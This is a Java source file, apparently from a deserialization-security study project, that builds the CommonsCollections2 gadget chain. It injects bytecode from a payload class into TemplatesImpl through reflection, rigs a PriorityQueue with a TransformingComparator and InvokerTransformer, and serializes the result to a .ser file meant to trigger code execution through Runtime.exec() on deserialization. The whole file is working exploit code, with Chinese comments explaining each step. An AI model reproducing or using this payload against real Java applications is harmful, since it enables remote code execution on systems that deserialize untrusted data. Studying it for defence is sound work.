package CommonsCollections2;

import javassist.*;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				PriorityQueue.heapify()
					PriorityQueue.siftDown()
						PriorityQueue.siftDownUsingConparator()
							TransformingComparator.compare()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
 */
/*
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
 */
public class exp {
    public static void main(String[] args) throws ClassNotFoundException, NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException {
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass clazz = pool.get(payload.class.getName());
        final byte[] clazzByte = clazz.toBytecode();
        //_bytecode为private，需要设置可访问
        Field _btcode = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _btcode.setAccessible(true);
        _btcode.set(tmp,new byte[][]{clazzByte});

        //_name不为空即可
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmp,"tr1ple");

        //_tfactory可为空
        Field _tf = TemplatesImpl.class.getDeclaredField("_tfactory");
        _tf.setAccessible(true);
        _tf.set(tmp,null);

        //
        //构造priorityqueue对象
        //
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);
        //InvokerTransformer trans = new InvokerTransformer("getOutputProperties",new Class[0],new Object[0]);

        //依赖collections4
        TransformingComparator com = new TransformingComparator(trans);

        Field ComFi = PriorityQueue.class.getDeclaredField("comparator");
        ComFi.setAccessible(true);
        ComFi.set(queue,com);

        Field qu = PriorityQueue.class.getDeclaredField("queue");
        qu.setAccessible(true);
        Object[] objOutput = (Object[])qu.get(queue);
        objOutput[0] = tmp;
        objOutput[1] = 1;

        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commoncollections2.ser");
        OutputStream out = new FileOutputStream(file);
        ObjectOutputStream obj = new ObjectOutputStream(out);
        obj.writeObject(queue);
        obj.close();



    }
}
